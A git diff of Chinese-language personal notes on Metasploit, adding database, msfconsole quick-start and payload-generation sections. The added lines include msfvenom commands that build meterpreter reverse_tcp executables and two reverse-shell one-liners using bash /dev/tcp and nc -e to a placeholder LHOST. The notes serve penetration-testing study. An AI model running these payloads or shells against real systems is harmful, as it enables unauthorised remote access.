@@ -1,5 +1,7 @@
 # Metasploit
 
+该工具存在免费版本 Metasploit Framework 和付费版本 Metasploit Pro, 后者提供了许多实用的专业功能, 但是天价.  
+
 ## 数据库
 
 初次使用 MSF 时可以利用 [msfdb](https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html) 对数据库进行自动初始化, 若自动初始化失败则进行[手动初始化](https://docs.rapid7.com/metasploit/managing-the-database/). 仅支持 [PostgreSQL](https://www.postgresql.org/) 数据库.  
@@ -27,12 +29,48 @@ db_export -f xml ./msfdb.xml # 将当前 workspace 中的数据以 xml 格式导
 !!! warning
     导出结果可能未空, 需要进行检查.  
 
-## Msfvenom
+## 快速入门
 
 ```sh
-msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=[ip] rc4password=[password] -f exe -o ~/payload.exe
-msfvenom -p linux/x64/meterpreter/reverse_tcp       LHOST=[ip]                        -f elf -o ~/payload
+msf > search [[type:]keyword] # 搜索 module
+msf > use [id/module]         # 使用 module, module 的名称或 search 指令结果中的 id
+msf > use [id/module]         # 显示 module 的详细信息.
+msf > setg [option] [value]   # 设置默认选项, 避免切换 module 时重复填写不变的参数
+
+msf(module) > options                 # 显示当前 module 的选项
+msf(module) > info                    # 显示当前 module 的详细信息
+msf(module) > show [option]           # 显示选项的可用选项
+msf(module) > set [option] [id/value] # 设置选项, 选项的值或 show 指令结果中的 id
+msf(module) > check                   # 部分 exploit module 支持, 用于验证 RHOSTS 是否可以被利用
+msf(module) > run                     # 执行 module
 ```
+
+## 生成载荷
+
+使用 msfvenom(msfpayload 和 msfencode 的替代品) 来生成载荷, 详情请参考[官方教程](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).  
+需要根据具体情况(包括漏洞利用方式, 架构, 系统, 环境, 通讯方式等)选择合适的载荷/编码器/格式等其他参数.  
+
+```sh
+msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=[LHOST] LPORT=[LPORT] rc4password=[password] -f exe -o ~/payload.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST=[LHOST] LPORT=[LPORT]                        -f exe -o ~/payload.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp       LHOST=[LHOST] LPORT=[LPORT]                        -f elf -o ~/payload
+
+msfvenom -l payload # 查看载荷, 根据目标进行选择
+msfvenom -l format  # 查看格式, 可以是可执行文件/脚本, 也可以只是用于源代码的 shellcode 代码片段
+```
+
+除了上传可执行文件到目标并执行, 也可以直接利用目标上的命令来获取 shell, 然后再将 shell 升级为 meterpreter.  
+
+```sh
+bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1
+nc [LHOST] [LPORT] -e /bin/sh
+```
+
+利用对应的 shell_reverse_tcp 建立连接.  
+
+## [Meterpreter](https://github.com/rapid7/metasploit-payloads)
+
+Meterpreter 是一种特殊的多功能载荷.  
 
 ## 后渗透测试
 
